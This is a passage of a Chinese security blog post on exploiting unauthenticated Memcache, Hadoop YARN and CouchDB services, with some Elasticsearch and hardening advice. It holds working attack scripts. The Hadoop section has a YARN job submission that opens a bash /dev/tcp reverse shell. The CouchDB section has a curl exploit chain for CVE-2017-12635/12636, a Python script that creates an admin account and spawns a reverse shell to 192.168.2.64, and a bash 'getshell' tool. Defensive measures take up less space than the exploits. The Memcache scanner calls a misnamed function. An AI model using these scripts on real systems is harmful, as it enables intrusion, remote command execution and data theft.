+<p>(2)、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。<br><a href="https://www.jianshu.com/p/7ec26c13abbb" target="_blank" rel="noopener">https://www.jianshu.com/p/7ec26c13abbb</a><br><a href="https://www.sojson.com/blog/213.html" target="_blank" rel="noopener">https://www.sojson.com/blog/213.html</a><br>(3)、限制IP访问，绑定固定IP<br>(4)、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install [github-name]/repo-name。同时需要注意增加验证后，请勿使用弱口令。 在config/elasticsearch.yml中为9200端口设置认证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http.basic.enabled     true     ##开关，开启会接管全部HTTP连接</span><br><span class="line">http.basic.user     &quot;admin&quot;     ##账号</span><br><span class="line">http.basic.password     &quot;admin_pw&quot;     ##密码</span><br><span class="line">http.basic.ipwhitelist     [&quot;localhost&quot;, &quot;127.0.0.1&quot;]     ##白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</span><br><span class="line">http.basic.trusted_proxy_chains     []     ##信任代理列表</span><br><span class="line">http.basic.log     false     ##把无授权的访问事件添加到ES的日志</span><br><span class="line">http.basic.xforward     &quot;&quot;     ##记载代理路径的header字段名</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf" target="_blank" rel="noopener">https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf</a><br><a href="https://blog.csdn.net/u011419453/article/details/39395627" target="_blank" rel="noopener">https://blog.csdn.net/u011419453/article/details/39395627</a></p>
+<h2 id="0x06-Memcache未授权访问"><a href="#0x06-Memcache未授权访问" class="headerlink" title="0x06 Memcache未授权访问"></a>0x06 Memcache未授权访问</h2><p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p>
+<h4 id="1-扫描探测-4"><a href="#1-扫描探测-4" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7tmj9xnj31uc0t64qp.jpg" alt="img"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">## _*_  coding:utf-8 _*_</span><br><span class="line">def Memcache_check(ip, port&#x3D;11211, timeout&#x3D;5):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;stats\r\n&quot;)</span><br><span class="line">        result &#x3D; s.recv(1024)</span><br><span class="line">        if &quot;STAT version&quot; in result:</span><br><span class="line">            print &#39;[+] Memcache Unauthorized: &#39; +ip+&#39;:&#39;+str(port)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-攻击利用-1"><a href="#2-攻击利用-1" class="headerlink" title="2.攻击利用"></a><strong>2.攻击利用</strong></h4><p><strong>2.1 基础部分</strong></p>
+<p>通过一个<code>cheat sheet</code>了解一下Memcached的协议。Memcached的语法由如下元素组成</p>
+<ul>
+<li>{COMMAND}0x20{ARGUMENT}(LF|CRLF)</li>
+</ul>
+<p>command字段有如下几条命令</p>
+<ul>
+<li>存储操作(set, add, replace, append, prepend, cas)</li>
+<li>检索操作 (get, gets)</li>
+<li>删除操作 (delete)</li>
+<li>增减操作 (incr, decr)</li>
+<li>touch</li>
+<li>slabs reassign</li>
+<li>slabs automove</li>
+<li>lru_crawler</li>
+<li>统计操作(stats items, slabs, cachedump)</li>
+<li>其他操作 (version, flush_all, quit)</li>
+</ul>
+<hr>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>描述</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>get</td>
+<td>读某个值</td>
+<td>get mykey</td>
+</tr>
+<tr>
+<td>set</td>
+<td>强制设置某个键值</td>
+<td>set mykey 0 60 5</td>
+</tr>
+<tr>
+<td>add</td>
+<td>添加新键值对</td>
+<td>add newkey 0 60 5</td>
+</tr>
+<tr>
+<td>replace</td>
+<td>覆盖已经存在的key</td>
+<td>replace key 0 60 5</td>
+</tr>
+<tr>
+<td>flush_all</td>
+<td>让所有条目失效</td>
+<td>flush_all</td>
+</tr>
+<tr>
+<td>stats</td>
+<td>打印当前状态</td>
+<td>stats</td>
+</tr>
+<tr>
+<td>stats malloc</td>
+<td>打印内存状态</td>
+<td>stats malloc</td>
+</tr>
+<tr>
+<td>version</td>
+<td>打印Memcached版本</td>
+<td>version</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats  &#x2F;&#x2F;查看memcache 服务状态</span><br><span class="line">stats items  &#x2F;&#x2F;查看所有items</span><br><span class="line">stats cachedump 32 0  &#x2F;&#x2F;获得缓存key</span><br><span class="line">get :state:264861539228401373:261588   &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.2 建立连接并获取信息</strong><br><code>telnet &lt;target&gt; 11211</code>，或<code>nc -vv &lt;target&gt; 11211</code>，无需用户名密码，可以直接连接memcache 服务的11211端口。<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7tw45o0j31e10u0e4c.jpg" alt="img"></p>
+<p>附赠大佬写的文章 <a href="https://xz.aliyun.com/t/2018" target="_blank" rel="noopener">Discuz!因Memcached未授权访问导致的RCE</a></p>
+<hr>
+<h4 id="3-防范措施-1"><a href="#3-防范措施-1" class="headerlink" title="3.防范措施"></a><strong>3.防范措施</strong></h4><p><em>1.限制访问</em><br>如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如：<br><code>memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p>
+<p>或者 vim /etc/sysconfig/memcached，修改配置文件<br><em><code>OPTIONS=&quot;-l 127.0.0.1&quot;</code></em>，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload</p>
+<p><em>2.防火墙</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 11211 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 11211 -j DROP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure>
+
+<p><em>3.使用最小化权限账号运行Memcached服务</em><br>使用普通权限账号运行，指定Memcached用户。<br><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p>
+<p><em>4.启用认证功能</em><br>Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。<a href="http://www.postfix.org/SASL_README.html?spm=a2c4g.11186623.2.5.RpKdcX##saslauthd" target="_blank" rel="noopener">SASL认证详细配置手册</a></p>
+<p><em>5.修改默认端口</em><br>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：<br><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</code></p>
+<p><em>6.定期升级</em></p>
+<p>参考:<br><a href="http://lzone.de/cheat-sheet/memcached" target="_blank" rel="noopener">http://lzone.de/cheat-sheet/memcached</a><br><a href="https://www.secpulse.com/archives/49659.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/49659.html</a><br><a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/" target="_blank" rel="noopener">https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/</a><br><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf</a><br><a href="http://niiconsulting.com/checkmate/2013/05/memcache-exploit/" target="_blank" rel="noopener">http://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a><br><a href="https://xz.aliyun.com/t/2018" target="_blank" rel="noopener">https://xz.aliyun.com/t/2018</a><br><a href="http://drops.xmd5.com/static/drops/web-8987.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/web-8987.html</a><br><a href="https://blog.csdn.net/microzone/article/details/79262549" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/79262549</a></p>
+<h2 id="0x07-Hadoop未授权访问"><a href="#0x07-Hadoop未授权访问" class="headerlink" title="0x07 Hadoop未授权访问"></a>0x07 Hadoop未授权访问</h2><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p>
+<ul>
+<li>用户创建一个处理键值的map函数</li>
+<li>产生了一套中间键/值</li>
+<li>reduce函数合并中间值并把他们关联到对应的键</li>
+</ul>
+<h4 id="1-扫描探测-5"><a href="#1-扫描探测-5" class="headerlink" title="1. 扫描探测"></a><strong>1. 扫描探测</strong></h4><p><strong>1.1 常见端口</strong><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-b993fcbc-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-b993fcbc-5195-1.png" alt="img"></a></p>
+<p><strong>1.2 敏感端口</strong></p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>节点</th>
+<th>默认端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HDFS</td>
+<td>NameNode</td>
+<td>50070</td>
+</tr>
+<tr>
+<td>HDFS</td>
+<td>SecondNameNode</td>
+<td>50090</td>
+</tr>
+<tr>
+<td>HDFS</td>
+<td>DataNode</td>
+<td>50075</td>
+</tr>
+<tr>
+<td>HDFS</td>
+<td>Backup/Checkpoint node</td>
+<td>50105</td>
+</tr>
+<tr>
+<td>MapReduce</td>
+<td>JobTracker</td>
+<td>50030</td>
+</tr>
+<tr>
+<td>MapReduce</td>
+<td>TaskTracker</td>
+<td>50060</td>
+</tr>
+</tbody></table>
+<p>通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ud5stsj31jo0u0b29.jpg" alt="img"></p>
+<h4 id="2-攻击手法"><a href="#2-攻击手法" class="headerlink" title="2. 攻击手法"></a><strong>2. 攻击手法</strong></h4><p>利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 <a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html" target="_blank" rel="noopener">REST API</a> 也可以提交任务执行。</p>
+<p>利用过程如下：</p>
+<ul>
+<li>在本地监听等待反弹 shell 连接</li>
+<li>调用 New Application API 创建 Application</li>
+<li>调用 Submit Application API 提交</li>
+</ul>
+<p><strong>P牛的攻击脚本</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8088&#x2F;&#39;</span><br><span class="line">lhost &#x3D; &#39;192.168.0.1&#39; ## put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;</span><br><span class="line">resp &#x3D; requests.post(url)</span><br><span class="line">app_id &#x3D; resp.json()[&#39;application-id&#39;]</span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;application-id&#39;: app_id,</span><br><span class="line">    &#39;application-name&#39;: &#39;get-shell&#39;,</span><br><span class="line">    &#39;am-container-spec&#39;: &#123;</span><br><span class="line">        &#39;commands&#39;: &#123;</span><br><span class="line">            &#39;command&#39;: &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;9999 0&gt;&amp;1&#39; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;application-type&#39;: &#39;YARN&#39;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json&#x3D;data)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7uy0e3bj31ua0u0u0x.jpg" alt="img"></p>
+<h4 id="3-防范措施-2"><a href="#3-防范措施-2" class="headerlink" title="3. 防范措施"></a><strong>3. 防范措施</strong></h4><p><em>1. 网络访问控制</em><br>使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。</p>
+<p><em>2. 启用认证功能</em><br>启用 Kerberos 认证功能。</p>
+<p><em>3. 更新补丁</em><br>不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。</p>
+<h2 id="0x08-CouchDB未授权访问"><a href="#0x08-CouchDB未授权访问" class="headerlink" title="0x08 CouchDB未授权访问"></a>0x08 CouchDB未授权访问</h2><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。<br>CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[query_servers]</span><br><span class="line">LANGUAGE &#x3D; PATH ARGS</span><br><span class="line">默认情况下，配置文件中已经设置了两个query_servers:</span><br><span class="line"></span><br><span class="line">[query_servers]</span><br><span class="line">javascript &#x3D; &#x2F;usr&#x2F;bin&#x2F;couchjs &#x2F;usr&#x2F;share&#x2F;couchdb&#x2F;server&#x2F;main.js</span><br><span class="line">coffeescript &#x3D; &#x2F;usr&#x2F;bin&#x2F;couchjs &#x2F;usr&#x2F;share&#x2F;couchdb&#x2F;server&#x2F;main-coffee.js</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了</p>
+<p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a><br><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></p>
+<p><em><code>影响版本：小于 1.7.0 以及 小于 2.1.1</code></em></p>
+<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p>
+<h4 id="1-扫描探测-6"><a href="#1-扫描探测-6" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p><code>nmap -p 5984 --script &quot;couchdb-stats.nse&quot; 127.0.0.1</code><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7vwdk3vj31uc0t64qp.jpg" alt="img"></p>
+<p><strong>2.两个版本的利用方式</strong></p>
+<p><strong><em>(1) 1.6.0 下的说明\</em></strong></p>
+<p>依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application&#x2F;json&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7w7fikvj31e10u0b29.jpg" alt="img">第一个请求是添加一个名字为cmd的query_servers，其值为<code>id &gt;/tmp/success</code>，这就是我们后面待执行的命令。<br>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br>第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。</p>
+<hr>
+<p><strong><em>(2) 2.1.0 下的说明\</em></strong></p>
+<p>2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。<br>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_membership</span><br></pre></td></tr></table></figure>
+
+<p>可见，我们这里只有一个node，名字是nonode@nohost。</p>
+<p>然后，我们修改nonode@nohost的配置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_node&#x2F;nonode@nohost&#x2F;_config&#x2F;query_servers&#x2F;cmd -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;_design&#x2F;vul -d &#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure>
+
+<p>增加_view的同时即触发了query_servers中的命令。</p>
+<p><strong>2.1 p牛的python脚本 支持高低版本,需要在version = 定义</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import requests</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5984&#39;</span><br><span class="line">command &#x3D; &#39;&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.64&#x2F;2222 0&gt;&amp;1&quot;&#39;</span><br><span class="line">version &#x3D; 2</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">session.headers &#x3D; &#123;</span><br><span class="line">    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">&#125;</span><br><span class="line">## session.proxies &#x3D; &#123;</span><br><span class="line">##     &#39;http&#39;: &#39;http:&#x2F;&#x2F;127.0.0.1:8085&#39;</span><br><span class="line">## &#125;</span><br><span class="line">session.put(target + &#39;&#x2F;_users&#x2F;org.couchdb.user:wooyun&#39;, data&#x3D;&#39;&#39;&#39;&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;wooyun&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;wooyun&quot;</span><br><span class="line">&#125;&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">session.auth &#x3D; HTTPBasicAuth(&#39;wooyun&#39;, &#39;wooyun&#39;)</span><br><span class="line"></span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.put(target + (&#39;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;), data&#x3D;command)</span><br><span class="line">else:</span><br><span class="line">    host &#x3D; session.get(target + &#39;&#x2F;_membership&#39;).json()[&#39;all_nodes&#39;][0]</span><br><span class="line">    session.put(target + &#39;&#x2F;_node&#x2F;&#123;&#125;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;.format(host), data&#x3D;command)</span><br><span class="line"></span><br><span class="line">session.put(target + &#39;&#x2F;wooyun&#39;)</span><br><span class="line">session.put(target + &#39;&#x2F;wooyun&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#39;)</span><br><span class="line"></span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.post(target + &#39;&#x2F;wooyun&#x2F;_temp_view?limit&#x3D;10&#39;, data&#x3D;&#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39;)</span><br><span class="line">else:</span><br><span class="line">    session.put(target + &#39;&#x2F;wooyun&#x2F;_design&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.2 bash自动化脚本</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">##!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">echo CouchDB getshell - c0debreak - tools.changesec.com</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">if [[ $## -ne 2 ]];then</span><br><span class="line">    echo Usage: $0 http:&#x2F;&#x2F;xx.xx.xx.xx:5984 myserver:myport</span><br><span class="line">    exit 1</span><br><span class="line">else</span><br><span class="line">    server&#x3D;$1</span><br><span class="line">    cb&#x3D;$&#123;2&#x2F;:&#x2F;\&#x2F;&#125;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">function run() &#123;</span><br><span class="line">    cmd&#x3D;$1</span><br><span class="line"></span><br><span class="line">    curl -XPUT &quot;$server&#x2F;_config&#x2F;query_servers&#x2F;cmd&quot; -d &quot;\&quot;$cmd\&quot;&quot;</span><br><span class="line">    curl -XPUT &quot;$server&#x2F;example&quot;</span><br><span class="line">    curl -XPUT &quot;$server&#x2F;example&#x2F;record&quot; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">    curl --max-time 1 &quot;$server&#x2F;example&#x2F;_temp_view?limit&#x3D;1&quot; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;, &quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run &quot;echo &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;$cb 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;shell&quot;</span><br><span class="line">run &quot;bash &#x2F;tmp&#x2F;shell&quot;</span><br><span class="line">run &quot;rm -f &#x2F;tmp&#x2F;shell&quot;</span><br><span class="line"></span><br><span class="line">curl -XDELETE &quot;$server&#x2F;_config&#x2F;query_servers&#x2F;cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7wr6bjwj31q40u0npe.jpg" alt="img"></p>
